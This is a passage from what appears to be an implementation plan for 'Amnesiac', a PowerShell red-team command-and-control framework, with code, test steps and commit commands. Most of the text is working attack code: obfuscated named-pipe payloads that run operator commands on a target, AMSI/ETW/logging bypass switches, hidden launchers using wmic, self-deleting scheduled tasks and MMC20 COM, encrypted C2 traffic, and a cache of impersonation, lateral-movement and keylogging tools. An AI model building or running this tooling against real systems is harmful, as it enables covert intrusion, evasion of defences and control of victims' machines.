        "`$$modVarName=`$Matches[1];`$$modVarBuf=[Text.StringBuilder]::new([int]`$Matches[2]);" +
        "`$$modVarLine=`$$vRd.ReadLine();" +
        "while(`$$modVarLine -ne `"__MODULE_END__:`$$modVarName`"){" +
        "if(`$$modVarLine -match '^__MODULE_CHUNK__:(.+)`$'){`$$modVarBuf.Append([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$Matches[1])))|Out-Null};" +
        "`$$modVarLine=`$$vRd.ReadLine()};" +
        "try{& ([scriptblock]::Create(`$$modVarBuf.ToString())) 2>&1|Out-Null}catch{};" +
        "`$$vWr.WriteLine('$marker');`$$vWr.Flush();continue}"
    )

    if (-not $IsServer) {
        # CLIENT — connects back to operator's named pipe server
        $pipeSetup = (
            "`$$vT=$clientType;" +
            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None;" +
            "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe);" +
            "`$$vPipe.Connect(600000);" +
            "`$$vWr.WriteLine(`"`$([Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)`");" +
            "`$$vWr.Flush()"
        )
        $loop = (
            "while(`$true){" +
            "`$$vCmd=`$$vRd.ReadLine();" +
            "if(`$$vCmd -eq 'exit'){break};" +
            "$moduleHandler;" +
            "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
            "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
            "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
            "`$$vPipe.Close();`$$vPipe.Dispose()"
        )
    } else {
        # SERVER — target hosts the pipe; operator connects in (GListener/Detached mode)
        $pipeSetup = (
            "`$$vSec=New-Object System.IO.Pipes.PipeSecurity;" +
            "`$$vSid=New-Object System.Security.Principal.SecurityIdentifier '$SID';" +
            "`$$vAr=New-Object System.IO.Pipes.PipeAccessRule(`$$vSid,'FullControl','Allow');" +
            "`$$vSec.AddAccessRule(`$$vAr);" +
            "`$$vT=$serverType;" +
            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName',[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::None,$bufSize,$bufSize,`$$vSec;" +
            "`$$vCb={param(`$$vTm);`$$vTm.Close()};`$$vTm=New-Object System.Threading.Timer(`$$vCb,`$$vPipe,600000,[System.Threading.Timeout]::Infinite);" +
            "`$$vPipe.WaitForConnection();" +
            "`$$vTm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$vTm.Dispose();" +
            "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe)"
        )
        $loop = (
            "while(`$true){if(-not `$$vPipe.IsConnected){break};" +
            "`$$vCmd=`$$vRd.ReadLine();" +
            "if(`$$vCmd -eq 'exit'){break};" +
            "$moduleHandler;" +
            "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
            "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
            "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
            "`$$vPipe.Disconnect();`$$vPipe.Dispose()"
        )
    }

    # Assemble raw script
    $rawScript = "$keyBlock;$asmLoad;$etwSnippet;$sblSnippet;$amsiSnippet;$jitter;$pipeSetup;$loop"

    # Gzip compress
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawScript)
    $ms    = [System.IO.MemoryStream]::new()
    $gzs   = [System.IO.Compression.GzipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
    $gzs.Write($bytes, 0, $bytes.Length)
    $gzs.Close()
    $b64 = [Convert]::ToBase64String($ms.ToArray())

    # Decompressor wrapper with mixed-case method names
    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();[scriptblock]::Create(`$$vD).Invoke()"

    return [PSCustomObject]@{
        InlinePS    = $decomp
        FullCommand = "powershell.exe -ep bypass -Window Hidden -c `"$decomp`""
        RawScript   = $rawScript
    }
}
```

- [x] **Step 8.2: Run New-PayloadScript tests**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"New-PayloadScript"` describe block (all 6 tests) now pass.

- [x] **Step 8.3: Wire New-PayloadScript into Start-Listener**

Find `Start-Listener` (≈line 1174). Locate the `elseif($global:payloadformat -eq 'stealth')` block (≈line 1278):

```powershell
# OLD:
elseif($global:payloadformat -eq 'stealth'){
    $stealthPayload = New-StealthScript -ComputerName $ComputerName -PipeName $PipeName
    Write-Output " [Inline PS — paste into existing session]"
    Write-Output " $($stealthPayload.InlinePS)"
    ...
}

# NEW — replace the stealth case AND use New-PayloadScript for ALL formats that produce PS:
elseif($global:payloadformat -eq 'stealth'){
    $built = New-PayloadScript -ComputerName $ComputerName -PipeName $PipeName
    Write-Output " [Inline PS — paste into existing session]"
    Write-Output " $($built.InlinePS)"
    Write-Output ""
    Write-Output " [Full command — run from cmd.exe on target]"
    $wrapped = Get-PayloadLauncher -Script $built.InlinePS -Launcher $global:PayloadConfig.Launcher
    Write-Output " $wrapped"
    Write-Output ""
}
```

Apply the same replacement in the GListener (`Start-GListener`) equivalent block.

- [x] **Step 8.4: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer2): New-PayloadScript modular builder — replaces New-StealthScript"
```

---

## Task 9: Layer 2 — `payload` Command Handler

**Files:**
- Modify: `Amnesiac.ps1` (main loop)

- [x] **Step 9.1: Add payload command handler in main loop**

Add the following handler in the main `while($true)` loop (before the `exit` check):

```powershell
            if ($choice -match '^payload(\s+(.+))?$') {
                $sub = ($Matches[2] -split '\s+', 3)
                $subcmd = $sub[0]
                $val    = if ($sub.Count -ge 2) { $sub[1] } else { $null }
                $extra  = if ($sub.Count -ge 3) { $sub[2] } else { $null }

                switch ($subcmd) {
                    'amsi' {
                        if ($val -in 'pageguard','hwbp','fail','direct') {
                            $global:PayloadConfig.Amsi = $val
                            $global:Message = " [+] Payload AMSI bypass: $val"
                            if ($val -in 'pageguard','hwbp') {
                                $global:Message += " (PS payload uses 'fail' fallback; full $val activates after 'load loader' in session)"
                            }
                        } else {
                            $global:Message = " [-] Valid options: pageguard hwbp fail direct"
                        }
                    }
                    'etw' {
                        if ($val -in 'provider','patch','thread') {
                            $global:PayloadConfig.Etw = $val
                            $global:Message = " [+] Payload ETW bypass: $val"
                        } else {
                            $global:Message = " [-] Valid options: provider patch thread"
                        }
                    }
                    'launcher' {
                        if ($val -in 'ps','wmi','schtask','com') {
                            $global:PayloadConfig.Launcher = $val
                            $global:Message = " [+] Payload launcher: $val"
                        } else {
                            $global:Message = " [-] Valid options: ps wmi schtask com"
                        }
                    }
                    'encoding' {
                        if ($val -in 'gzip','b64','raw','pwraw') {
                            $global:PayloadConfig.Encoding = $val
                            $global:payloadformat = $val    # keep existing toggle in sync
                            $global:Message = " [+] Payload encoding: $val"
                        } else {
                            $global:Message = " [-] Valid options: gzip b64 raw pwraw"
                        }
                    }
                    'jitter' {
                        if ($val -in 'off','low','medium','high') {
                            $global:PayloadConfig.Jitter = $val
                            $global:Message = " [+] Payload jitter: $val"
                        } else {
                            $global:Message = " [-] Valid options: off low medium high"
                        }
                    }
                    'obfuscation' {
                        if ($val -in 'low','medium','high') {
                            $global:PayloadConfig.Obfuscation = $val
                            $global:Message = " [+] Payload obfuscation: $val"
                        } else {
                            $global:Message = " [-] Valid options: low medium high"
                        }
                    }
                    'key' {
                        if ($val -in 'hostname','domain','user' -and $extra) {
                            $global:PayloadConfig.Keys[$val] = $extra
                            $global:Message = " [+] Payload key $val = $extra"
                        } elseif ($val -eq 'clear') {
                            $global:PayloadConfig.Keys = @{}
                            $global:Message = " [+] Payload keys cleared"
                        } elseif ($val -eq 'show') {
                            if ($global:PayloadConfig.Keys.Count -eq 0) {
                                $global:Message = " [-] No payload keys set"
                            } else {
                                $global:PayloadConfig.Keys.GetEnumerator() | % {
                                    Write-Host "  $($_.Key) = $($_.Value)"
                                }
                            }
                        } else {
                            $global:Message = " [-] Usage: payload key [hostname|domain|user] <value>  |  payload key clear  |  payload key show"
                        }
                    }
                    'reset' {
                        $global:PayloadConfig = @{
                            Amsi='pageguard'; Etw='provider'; Sbl=$true
                            Launcher='ps'; Encoding='gzip'; Jitter='medium'
                            Obfuscation='high'; Keys=@{}
                        }
                        $global:Message = " [+] Payload config reset to defaults"
                    }
                    default {
                        # Show current config
                        Write-Host ""
                        Write-Host " [+] Current payload configuration:" -ForegroundColor Cyan
                        Write-Host "     amsi:        $($global:PayloadConfig.Amsi)"
                        Write-Host "     etw:         $($global:PayloadConfig.Etw)"
                        Write-Host "     sbl:         $($global:PayloadConfig.Sbl)"
                        Write-Host "     launcher:    $($global:PayloadConfig.Launcher)"
                        Write-Host "     encoding:    $($global:PayloadConfig.Encoding)"
                        Write-Host "     jitter:      $($global:PayloadConfig.Jitter)"
                        Write-Host "     obfuscation: $($global:PayloadConfig.Obfuscation)"
                        if ($global:PayloadConfig.Keys.Count -gt 0) {
                            Write-Host "     keys:        $($global:PayloadConfig.Keys | ConvertTo-Json -Compress)"
                        } else {
                            Write-Host "     keys:        (none)"
                        }
                        Write-Host ""
                    }
                }
                continue
            }
```

- [x] **Step 9.2: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer2): payload command handler — amsi/etw/launcher/encoding/jitter/obfuscation/key/reset"
```

---

## Task 10: Layer 2 — Launcher Variants

**Files:**
- Modify: `Amnesiac.ps1` (module-level section)

- [x] **Step 10.1: Implement Get-PayloadLauncher at module level**

Replace the stub with:

```powershell
function Get-PayloadLauncher {
    param(
        [string]$Script,    # the encoded PS script string (inline payload)
        [string]$Launcher = 'ps'
    )

    switch ($Launcher) {
        'ps' {
            return "powershell.exe -ep bypass -Window Hidden -c `"$Script`""
        }

        'wmi' {
            # WmiPrvSE.exe as parent — run via wmic on the target
            $escaped = $Script -replace '"','\"'
            return "wmic process call create `"powershell.exe -ep bypass -Window Hidden -c \`"$escaped\`"`""
        }

        'schtask' {
            # svchost.exe (Task Scheduler) as parent — one-shot task, self-deletes
            $taskName = -join ((65..90 + 97..122) | Get-Random -Count 12 | % { [char]$_ })
            $escaped  = $Script -replace '"','\"'
            return (
                "schtasks /create /tn $taskName /tr `"powershell.exe -ep bypass -Window Hidden -c \`"$escaped\`"`" /sc once /st 00:00 /f && " +
                "schtasks /run /tn $taskName && " +
                "timeout /t 3 >nul && " +
                "schtasks /delete /tn $taskName /f"
            )
        }

        'com' {
            # mmc.exe as parent — uses MMC20.Application COM object
            $escaped = $Script -replace "'","''"
            return (
                "`$_com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application',`$env:COMPUTERNAME));" +
                "`$_com.Document.ActiveView.ExecuteShellCommand('powershell.exe',`$null,'-ep bypass -Window Hidden -c ""$escaped""','7')"
            )
        }

        default {
            return Get-PayloadLauncher -Script $Script -Launcher 'ps'
        }
    }
}
```

- [x] **Step 10.2: Run launcher tests**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"Get-PayloadLauncher"` describe block (4 tests) all pass.

- [x] **Step 10.3: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer2): Get-PayloadLauncher — ps/wmi/schtask/com launcher variants"
```

---

## Task 11: Layer 4 — Network Logon Token Detection

**Files:**
- Modify: `Amnesiac.ps1` (module-level section)

- [x] **Step 11.1: Implement Test-NetworkLogonToken**

Replace the stub with:

```powershell
function Test-NetworkLogonToken {
    # Returns $true if the current process has a Type-9 (NewCredentials) logon session,
    # which is created by runas /netonly. Confirms domain resources are accessible
    # from a non-domain-joined machine.
    try {
        Add-Type -AssemblyName System.DirectoryServices.AccountManagement -ErrorAction Stop
    } catch {}

    try {
        $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
        # The token type for runas /netonly is SECURITY_LOGON_TYPE = 9 (NewCredentials)
        # We detect this by checking if the identity name differs from the local machine
        # AND the process has a Kerberos ticket (network logon session present)
        $groups = $id.Groups
        # A Type-9 logon produces an identity where the user is the network credential
        # and the groups include domain groups if domain credentials are valid.
        # Heuristic: if $id.AuthenticationType is 'Kerberos' or domain name is not local
        if ($id.AuthenticationType -in 'Kerberos','NTLM') {
            $domainPart = ($id.Name -split '\\')[0]
            $localNames = @($env:COMPUTERNAME, 'NT AUTHORITY', 'BUILTIN')
            if ($domainPart -notin $localNames) {
                return $true
            }
        }
        return $false
    } catch {
        return $false
    }
}
```

- [x] **Step 11.2: Run token detection test**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"Test-NetworkLogonToken"` describe block passes (returns a bool — actual value depends on how the test is run).

- [x] **Step 11.3: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer4): Test-NetworkLogonToken — detect runas /netonly Type-9 logon session"
```

---

## Task 12: Layer 4 — Engagement Profiles + OPSEC Banner

**Files:**
- Modify: `Amnesiac.ps1`

- [x] **Step 12.1: Implement Show-OpsecBanner at module level**

Replace the stub with:

```powershell
function Show-OpsecBanner {
    $diskState  = if ($global:DiskMode)          { "ON " } else { "OFF" }
    $engState   = if ($global:EngagementProfile) { $global:EngagementProfile } else { "(not set)" }
    $tokenInfo  = if (Test-NetworkLogonToken)     {
                      $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                      $id.Name
                  } else { "(no network logon token)" }
    $cacheCount = $global:ToolCache.Keys.Count
    $loaderState = if ($AmnesiacLoaderB64) { "embedded" } else { "(not embedded)" }
    $pskState   = if ($global:PSKBytes)    { "configured" } else { "derived (pipe name)" }

    Write-Host ""
    Write-Host " [+] Amnesiac — Red Team Edition" -ForegroundColor Green
    Write-Host " " + ("─" * 50)
    Write-Host " [+] Disk mode:        $diskState"
    Write-Host " [+] Engagement:       $engState"
    Write-Host " [+] Network token:    $tokenInfo"
    Write-Host " [+] Tool cache:       $cacheCount modules loaded"
    Write-Host " [+] End marker:       $($global:EndMarker)  (session-unique)"
    Write-Host " [+] Buffer size:      $($global:BufferSize) bytes"
    Write-Host " [+] Loader:           AmnesiacLoader ($loaderState)"
    Write-Host " [+] Payload profile:  amsi=$($global:PayloadConfig.Amsi) etw=$($global:PayloadConfig.Etw) launcher=$($global:PayloadConfig.Launcher) obfuscation=$($global:PayloadConfig.Obfuscation)"
    Write-Host " [+] PSK:              $pskState"
    Write-Host " " + ("─" * 50)

    $heavy = @('Suntour','Ferrari','ppl','TermsrvPatcher','RDPKeylog.exe')
    $missing = $heavy | Where-Object { -not $global:ToolCache.ContainsKey($_) }
    if ($missing) {
        Write-Host " [!] Heavy modules not cached: $($missing -join ', ')" -ForegroundColor Yellow
        Write-Host "     Run 'serve' to enable via local HTTP server" -ForegroundColor Yellow
    }
    Write-Host ""
}
```

- [x] **Step 12.2: Call Show-OpsecBanner at Amnesiac startup**

Inside `function Amnesiac {}`, after `Initialize-ToolCache` is called (which you'll add in Task 14), add:

```powershell
    Show-OpsecBanner
```

This goes in the startup section, before `while($true)`.

- [x] **Step 12.3: Add `engagement` command handler in main loop**

```powershell
            if ($choice -match '^engagement(\s+(nondomained|domained|reset))?$') {
                $profile = $Matches[2]
                switch ($profile) {
                    'nondomained' {
                        $global:EngagementProfile = 'nondomained'
                        # Apply profile-driven defaults
                        $global:PSKBytes = $null   # will be re-derived using pipe name + operator IP
                        $tokenOk = Test-NetworkLogonToken
                        if ($tokenOk) {
                            $id = [System.Security.Principal.WindowsIdentity]::GetCurrent()
                            $global:Message = " [+] Engagement: nondomained | Network token: $($id.Name)"
                        } else {
                            Write-Host ""
                            Write-Host " [!] WARNING: No network logon token detected." -ForegroundColor Red
                            Write-Host "     Launch Amnesiac from: runas /netonly /user:DOMAIN\user powershell.exe" -ForegroundColor Yellow
                            Write-Host ""
                        }
                    }
                    'domained' {
                        $global:EngagementProfile = 'domained'
                        $global:Message = " [+] Engagement: domained (assumed breach)"
                    }
                    'reset' {
                        $global:EngagementProfile = $null
                        $global:Message = " [+] Engagement profile cleared"
                    }
                    default {
                        $state = if ($global:EngagementProfile) { $global:EngagementProfile } else { "(not set)" }
                        $global:Message = " [+] Engagement: $state"
                    }
                }
                continue
            }
```

- [x] **Step 12.4: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer4): Show-OpsecBanner, engagement command, profile-driven defaults"
```

---

## Task 13: Layer 4 — AES Pipe Channel Encryption

**Files:**
- Modify: `Amnesiac.ps1` (module-level + main loop + session interaction)

- [x] **Step 13.1: Implement Protect-PipeMessage and Unprotect-PipeMessage**

Replace the stubs with:

```powershell
function Protect-PipeMessage {
    param([string]$PlainText, [byte[]]$Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key     = $Key
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.GenerateIV()
    $enc       = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $cipher    = $enc.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    $aes.Dispose()
    return [Convert]::ToBase64String($aes.IV + $cipher)
}

function Unprotect-PipeMessage {
    param([string]$CipherB64, [byte[]]$Key)
    $bytes  = [Convert]::FromBase64String($CipherB64)
    $iv     = $bytes[0..15]
    $cipher = $bytes[16..($bytes.Length - 1)]
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key     = $Key
    $aes.IV      = $iv
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $dec  = $aes.CreateDecryptor()
    $plain = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
    $aes.Dispose()
    return [System.Text.Encoding]::UTF8.GetString($plain)
}

function Get-PskDerivedKey {
    param([string]$Passphrase)
    $sha  = [System.Security.Cryptography.SHA256]::Create()
    $hash = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Passphrase))
    $sha.Dispose()
    return $hash[0..15]
}
```

- [x] **Step 13.2: Run AES tests**

```powershell
Invoke-Pester -Path .\Tests\Test-AmnesiacHelpers.ps1 -Output Detailed
```

Expected: `"AES pipe encryption helpers"` describe block (3 tests) all pass. Note the `Dispose()` fix required in `Protect-PipeMessage` — the IV must be read before disposal. Fix:

```powershell
function Protect-PipeMessage {
    param([string]$PlainText, [byte[]]$Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key     = $Key
    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.GenerateIV()
    $iv        = $aes.IV    # read IV before dispose
    $enc       = $aes.CreateEncryptor()
    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
    $cipher    = $enc.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
    $aes.Dispose()
    return [Convert]::ToBase64String($iv + $cipher)
}
```

Re-run tests: all 3 pass.

- [x] **Step 13.3: Add `psk` command handler**

```powershell
            if ($choice -match '^psk(\s+(.+))?$') {
                $arg = $Matches[2]
                if (-not $arg) {
                    if ($global:PSKBytes) {
                        $global:Message = " [+] PSK: configured (masked)"
                    } else {
                        $global:Message = " [+] PSK: using default (derived from pipe name)"
                    }
                } elseif ($arg -eq 'reset') {
                    $global:PSKPhrase = $null
                    $global:PSKBytes  = $null
                    $global:Message = " [+] PSK reset to default (derived from pipe name)"
                } else {
                    $global:PSKPhrase = $arg
                    $global:PSKBytes  = Get-PskDerivedKey -Passphrase $arg
                    $global:Message = " [+] PSK configured"
                }
                continue
            }
```

- [x] **Step 13.4: Integrate AES encryption into session read/write**

Locate the `InteractWithPipeSession` function (or the equivalent loop that reads/writes to an established pipe session). The encryption wrapper applies only when `$global:PSKBytes` is set and a session key has been exchanged.

Add two wrapper functions that are called instead of `$reader.ReadLine()` / `$writer.WriteLine()`:

```powershell
# Inside Amnesiac {} (can be nested functions since they use session-local $sessionKey)
function Read-PipeLine {
    param($Reader, [byte[]]$SessionKey)
    $line = $Reader.ReadLine()
    if ($SessionKey -and $line) {
        try { return Unprotect-PipeMessage -CipherB64 $line -Key $SessionKey }
        catch { return $line }   # fallback: return as-is if decryption fails
    }
    return $line
}

function Write-PipeLine {
    param($Writer, [string]$Data, [byte[]]$SessionKey)
    if ($SessionKey) {
        $Writer.WriteLine((Protect-PipeMessage -PlainText $Data -Key $SessionKey))
    } else {
        $Writer.WriteLine($Data)
    }
}
```

Then update the session interaction loop to use `Read-PipeLine`/`Write-PipeLine` instead of direct `ReadLine()`/`WriteLine()`.

The key exchange logic (session key extraction from first message) is added to the connection handler:

```powershell
# After pipe connects and before first ReadLine:
$sessionKey = $null
if ($global:PSKBytes) {
    $encKeyB64 = $reader.ReadLine()
    try {
        $encKeyBytes = [Convert]::FromBase64String($encKeyB64)
        $sessionKey  = Unprotect-PipeMessage -CipherB64 $encKeyB64 -Key $global:PSKBytes
        # sessionKey is now the 16-byte session key for this session
        # Re-derive as bytes:
        $sessionKeyBytes = [Convert]::FromBase64String((Protect-PipeMessage -PlainText "" -Key $global:PSKBytes))
        # Simpler: decode the encrypted session key directly
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $global:PSKBytes; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
        $iv = $encKeyBytes[0..15]; $cipher = $encKeyBytes[16..($encKeyBytes.Length-1)]
        $aes.IV = $iv
        $dec = $aes.CreateDecryptor()
        $sessionKeyBytes = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
        $aes.Dispose()
    } catch { $sessionKeyBytes = $null }
} else { $sessionKeyBytes = $null }
```

Note: The generated payload also needs the target-side key generation and key exchange protocol prepended. Add this to `New-PayloadScript` when `$global:PSKBytes` is set — prepend before `$pipeSetup`:

```powershell
$keyExchange = ''
if ($global:PSKBytes) {
    $pskB64 = [Convert]::ToBase64String($global:PSKBytes)
    $keyExchange = (
        # Generate random 16-byte session key, encrypt with PSK, send as first message
        "`$_sk=New-Object byte[] 16;[Security.Cryptography.RNGCryptoServiceProvider]::Create().GetBytes(`$_sk);" +
        "`$_aes=[Security.Cryptography.Aes]::Create();`$_aes.Key=[Convert]::FromBase64String('$pskB64');`$_aes.Mode='CBC';`$_aes.Padding='PKCS7';`$_aes.GenerateIV();" +
        "`$_enc=`$_aes.CreateEncryptor();`$_ek=`$_enc.TransformFinalBlock(`$_sk,0,16);" +
        "`$$vWr.WriteLine([Convert]::ToBase64String(`$_aes.IV+`$_ek));`$$vWr.Flush();`$_aes.Dispose();" +
        "function _EP(`$t){`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$_sk;`$a.Mode='CBC';`$a.Padding='PKCS7';`$a.GenerateIV();`$iv=`$a.IV;`$e=`$a.CreateEncryptor();`$b=`$e.TransformFinalBlock([Text.Encoding]::UTF8.GetBytes(`$t),0,[Text.Encoding]::UTF8.GetByteCount(`$t));`$a.Dispose();return [Convert]::ToBase64String(`$iv+`$b)};" +
        "function _DP(`$c){`$b=[Convert]::FromBase64String(`$c);`$a=[Security.Cryptography.Aes]::Create();`$a.Key=`$_sk;`$a.IV=`$b[0..15];`$a.Mode='CBC';`$a.Padding='PKCS7';`$d=`$a.CreateDecryptor();return [Text.Encoding]::UTF8.GetString(`$d.TransformFinalBlock(`$b[16..(`$b.Length-1)],0,`$b.Length-16))};"
    )
    # Loop reads/writes must use _EP()/_DP() — update $loop to wrap
    $loop = $loop -replace "`$$vRd\.ReadLine\(\)", "_DP(`$$vRd.ReadLine())"
    $loop = $loop -replace "`$$vWr\.WriteLine\(`$_.TrimEnd\(\)\)", "`$$vWr.WriteLine(_EP(`$_.TrimEnd()))"
    $loop = $loop -replace "`$$vWr\.WriteLine\(`$_\)\}", "`$$vWr.WriteLine(_EP(`$_))}"
    $loop = $loop -replace "\.WriteLine\('$marker'\)", ".WriteLine(_EP('$marker'))"
}
```

Add `$keyExchange` to `$rawScript` after `$jitter`: `$rawScript = "$keyBlock;$asmLoad;$etwSnippet;$sblSnippet;$amsiSnippet;$jitter;$keyExchange;$pipeSetup;$loop"`

- [x] **Step 13.5: Commit**

```powershell
git add Amnesiac.ps1
git commit -m "feat(layer4): AES-128 CBC pipe encryption — Protect/Unprotect, PSK command, session key exchange"
```

---

## Task 14: Layer 3 — Tool Cache + `modules` Command

**Files:**
- Modify: `Amnesiac.ps1` (module-level + main loop)

- [x] **Step 14.1: Implement Initialize-ToolCache**

Replace the stub with:

```powershell
function Initialize-ToolCache {
    $global:ToolCache = @{}

    # --- CORE TIER: embedded as gzip+base64 constants ---
    # Each constant is created by: gzip compress script content -> base64 encode
    # To add a new core tool: run New-EmbeddedTool -Path .\Tools\ToolName.ps1 -Name ToolName
    $coreTools = @{
        # Populated by Build-ToolCache.ps1 (see below) or manually
        # Format: 'ToolName' = 'base64gzip'
    }
    foreach ($name in $coreTools.Keys) {
        try {
            $bytes = [Convert]::FromBase64String($coreTools[$name])
            $ms  = [System.IO.MemoryStream]::new($bytes)
            $gz  = [System.IO.Compression.GZipStream]::new($ms, [System.IO.Compression.CompressionMode]::Decompress)
            $out = [System.IO.MemoryStream]::new()
            $gz.CopyTo($out); $gz.Close(); $ms.Close()
            $global:ToolCache[$name] = [System.Text.Encoding]::UTF8.GetString($out.ToArray())
        } catch {
            Write-Host " [!] Failed to load core tool '$name': $_" -ForegroundColor Red
        }
    }

    # --- STANDARD TIER: local Tools\ directory ---
    $toolsDir = Join-Path $PSScriptRoot "Tools"
    if (Test-Path $toolsDir) {
        Get-ChildItem -Path $toolsDir -Filter "*.ps1" | ForEach-Object {
            $name = $_.BaseName
            try {
                $global:ToolCache[$name] = Get-Content $_.FullName -Raw -Encoding UTF8
            } catch {
                Write-Host " [!] Failed to load tool '$name' from Tools\: $_" -ForegroundColor Red
            }
        }
    }

    # Note: Heavy tier (Suntour, Ferrari, ppl, etc.) loaded on demand via operator HTTP server.
    # Not pre-loaded here.
}

function New-EmbeddedTool {
    # Helper to convert a .ps1 file to a gzip+base64 constant for the core tier
    param([string]$Path, [string]$Name)
    $bytes = [System.Text.Encoding]::UTF8.GetBytes((Get-Content $Path -Raw -Encoding UTF8))
    $ms  = [System.IO.MemoryStream]::new()
    $gz  = [System.IO.Compression.GZipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
    $gz.Write($bytes, 0, $bytes.Length); $gz.Close()
    $b64 = [Convert]::ToBase64String($ms.ToArray())
    Write-Host "'$Name' = '$b64'"
}
```

Call `Initialize-ToolCache` at Amnesiac startup, before `Show-OpsecBanner`:
```powershell
    Initialize-ToolCache
    Show-OpsecBanner
```

- [x] **Step 14.2: Embed core tools using New-EmbeddedTool**

For each core tool, run to get the base64 blob, then paste into the `$coreTools` hashtable:

```powershell
. .\Amnesiac.ps1
New-EmbeddedTool -Path .\Tools\SimpleAMSI.ps1 -Name 'SimpleAMSI'
New-EmbeddedTool -Path .\Tools\NETAMSI.ps1    -Name 'NETAMSI'
New-EmbeddedTool -Path .\Tools\Token-Impersonation.ps1 -Name 'Token-Impersonation'
New-EmbeddedTool -Path .\Tools\Invoke-SMBRemoting.ps1  -Name 'Invoke-SMBRemoting'
New-EmbeddedTool -Path .\Tools\Invoke-WMIRemoting.ps1  -Name 'Invoke-WMIRemoting'
New-EmbeddedTool -Path .\Tools\Find-LocalAdminAccess.ps1 -Name 'Find-LocalAdminAccess'
```

Paste output into `$coreTools = @{ ... }` in `Initialize-ToolCache`.

- [x] **Step 14.3: Add `modules` command handler**

```powershell
            if ($choice -match '^modules(\s+(reload|status))?$') {
                $sub = $Matches[2]
                if ($sub -eq 'reload') {
                    Initialize-ToolCache
                    $global:Message = " [+] Tool cache refreshed: $($global:ToolCache.Count) modules"
                } elseif ($sub -eq 'status') {
                    Write-Host ""
                    Write-Host " [+] Tool cache breakdown:" -ForegroundColor Cyan
                    $coreNames = @('SimpleAMSI','NETAMSI','Token-Impersonation','Invoke-SMBRemoting','Invoke-WMIRemoting','Find-LocalAdminAccess')
                    $heavyNames = @('Suntour','Ferrari','ppl','TermsrvPatcher','RDPKeylog.exe')
                    $core    = $coreNames    | Where-Object { $global:ToolCache.ContainsKey($_) }
                    $std     = $global:ToolCache.Keys | Where-Object { $_ -notin $coreNames -and $_ -notin $heavyNames }
                    $heavy   = $heavyNames   | Where-Object { $global:ToolCache.ContainsKey($_) }
                    Write-Host "  Core    (embedded): $($core.Count)/$($coreNames.Count) — $($core -join ', ')"
                    Write-Host "  Standard (Tools\):  $($std.Count) — $($std -join ', ')"
                    Write-Host "  Heavy   (HTTP):     $($heavy.Count)/$($heavyNames.Count) — run 'serve' to load"
                    Write-Host ""
                } else {
                    # List all cached tools
                    Write-Host ""
